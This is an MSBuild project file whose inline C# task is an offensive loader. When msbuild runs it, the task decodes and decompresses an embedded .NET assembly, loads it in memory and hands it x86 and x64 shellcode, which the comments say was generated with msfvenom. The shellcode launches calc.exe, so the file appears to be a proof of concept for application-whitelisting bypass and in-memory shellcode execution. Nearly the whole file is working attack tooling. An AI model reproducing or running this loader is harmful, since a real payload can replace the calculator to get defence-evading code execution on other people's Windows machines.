<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Sample"><Sample /></Target>
  <UsingTask
    TaskName="Sample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task><Code Type="Class" Language="cs"><![CDATA[

using System;
using System.Reflection;
using System.IO;
using System.IO.Compression;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;


public class Sample : Microsoft.Build.Utilities.Task, Microsoft.Build.Framework.ITask {

    private static string encoded_compressed_dll = @"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";
        
    // msfvenom -p windows/exec CMD=calc.exe -f raw | base64
    private static String x86_shellcode = @"
        /OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjj
        SAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sE
        iwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu/C1olZoppW9nf/VPAZ8CoD7
        4HUFu0cTcm9qAFP/1WNhbGMuZXhlAA==";

    // msfvenom -p windows/x64/exec CMD=calc.exe -f raw | base64
    private static String x64_shellcode = @"
        /EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHB
        yQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHW
        TTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFY
        QVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//V
        u/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";

    private static byte[] decode_decompress_dll(string ecdll)
    {
        byte[] compressed_dll = System.Convert.FromBase64String(ecdll);
        System.IO.MemoryStream memstream = new System.IO.MemoryStream(compressed_dll.Length);
        System.IO.MemoryStream msptr = new System.IO.MemoryStream();
        memstream.Write(compressed_dll, 0, compressed_dll.Length);
        memstream.Seek(0, System.IO.SeekOrigin.Begin);
        using (System.IO.Compression.DeflateStream deflator =
            new System.IO.Compression.DeflateStream(
                memstream,
                System.IO.Compression.CompressionMode.Decompress
            )
        )
        {
            byte[] block = new byte[4096];
            int nbytes;
            while ((nbytes = deflator.Read(block, 0, block.Length)) != 0)
                msptr.Write(block, 0, nbytes);
        }
        return msptr.ToArray();
    }

    public override bool Execute()
    {
        System.Reflection.Assembly loaded_assembly = System.Reflection.Assembly.Load(
            decode_decompress_dll(encoded_compressed_dll)
        );
        System.Type astype = loaded_assembly.GetType("Example2");
        object class_instance = System.Activator.CreateInstance(astype, null);
        System.Reflection.MethodInfo entrypoint = astype.GetMethod("Run");
        entrypoint.Invoke(class_instance, new object[] { x86_shellcode, x64_shellcode });
        return true;
    }
}

      ]]></Code>
    </Task>
  </UsingTask>
</Project>

